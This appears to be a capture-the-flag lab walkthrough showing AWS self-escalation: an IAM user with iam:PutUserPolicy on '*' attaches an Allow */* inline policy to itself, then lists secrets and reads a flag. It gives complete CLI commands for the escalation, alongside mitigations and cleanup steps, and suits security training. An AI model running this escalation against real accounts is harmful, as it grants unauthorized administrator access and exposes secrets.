# Guided Walkthrough: Self-Escalation Privilege Escalation via iam:PutUserPolicy

This scenario demonstrates a privilege escalation vulnerability where a principal has permission to put inline policies on IAM users, including themselves. The attacker can use `iam:PutUserPolicy` to attach an inline policy granting administrator access to their own user, immediately escalating their privileges.

This is one of the most direct self-escalation paths available in AWS: no role assumption, no intermediary resource, no waiting for an event trigger. If an IAM user holds `iam:PutUserPolicy` without a resource constraint, they can become an administrator in a single API call. This misconfiguration appears in real environments when developers are given broad IAM management permissions for convenience, or when a permissions boundary is absent or misconfigured.

The danger is compounded by the immediacy of the escalation. Unlike some privilege escalation techniques that require triggering a secondary service or waiting for a scheduled job, inline policy changes take effect within seconds. By the time a SIEM alert fires, the attacker may already have extracted credentials, enumerated resources, or established persistence.

## The Challenge

You start as `pl-prod-iam-007-to-admin-starting-user` — an IAM user with limited permissions. Your goal is to reach effective administrator access within the same AWS account.

Your starting principal:
```
arn:aws:iam::{account_id}:user/pl-prod-iam-007-to-admin-starting-user
```

The user's attached policy grants `iam:PutUserPolicy` scoped to `*`. That single permission is all you need.

## Reconnaissance

First, confirm who you are and what you can do. Set your credentials and check your identity:

```bash
export AWS_ACCESS_KEY_ID="<starting_user_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<starting_user_secret_access_key>"
unset AWS_SESSION_TOKEN

aws sts get-caller-identity --query 'Arn' --output text
```

You should see your starting user ARN. Now test whether you have any meaningful permissions yet — try listing IAM users:

```bash
aws iam list-users --max-items 1
```

This should return an `AccessDenied` error, confirming you currently have limited permissions. Check your inline and managed policies to understand exactly what you hold:

```bash
aws iam list-user-policies --user-name pl-prod-iam-007-to-admin-starting-user
aws iam list-attached-user-policies --user-name pl-prod-iam-007-to-admin-starting-user
```

You will find a policy that grants `iam:PutUserPolicy` on `*`. That is your foothold.

## Exploitation

With `iam:PutUserPolicy` on `*`, you can attach any inline policy to any IAM user — including yourself. Craft an inline policy that grants unrestricted access and push it onto your own user:

```bash
aws iam put-user-policy \
  --user-name pl-prod-iam-007-to-admin-starting-user \
  --policy-name EscalatedAdminPolicy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*"
      }
    ]
  }'
```

If the call succeeds without error, the inline policy is now attached. IAM policy changes propagate quickly — wait about 15 seconds for the change to take effect globally before testing.

```bash
echo "Waiting 15 seconds for policy propagation..."
sleep 15
```

## Verification

Now test whether the escalation worked by exercising a permission you definitely did not have before:

```bash
aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text
```

If you get a list of IAM usernames rather than an `AccessDenied` error, you have administrator access. You can also check S3:

```bash
aws s3 ls
```

Or try a sensitive action such as listing secrets:

```bash
aws secretsmanager list-secrets
```

Any of these succeeding confirms full privilege escalation.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the inline `Action: *` policy you just attached to yourself provides.

Using your starting user credentials (which, thanks to the previous step, now hold effective AdministratorAccess via the inline policy), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/iam-007-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You started as an IAM user with a single dangerous permission: `iam:PutUserPolicy` on `*`. By calling that API on your own user, you attached an inline policy granting `Action: *` on `Resource: *` — the equivalent of the AWS managed `AdministratorAccess` policy.

The attack chain is entirely self-contained:

```
pl-prod-iam-007-to-admin-starting-user
  → iam:PutUserPolicy (on self)
  → Inline policy: Allow * on *
  → Effective AdministratorAccess
```

In a real environment, this technique is often overlooked because `iam:PutUserPolicy` sounds like a routine IAM management permission. The critical oversight is the lack of a resource constraint: a permission like `iam:PutUserPolicy` on `arn:aws:iam::*:user/pl-prod-*` still allows self-modification if your username matches the pattern. The only safe restriction is an explicit deny on self-targeting or a permissions boundary that caps effective permissions regardless of what inline policies are attached.

Run `plabs cleanup iam-007-iam-putuserpolicy` (or the cleanup script directly) to remove the `EscalatedAdminPolicy` inline policy and restore the starting state.
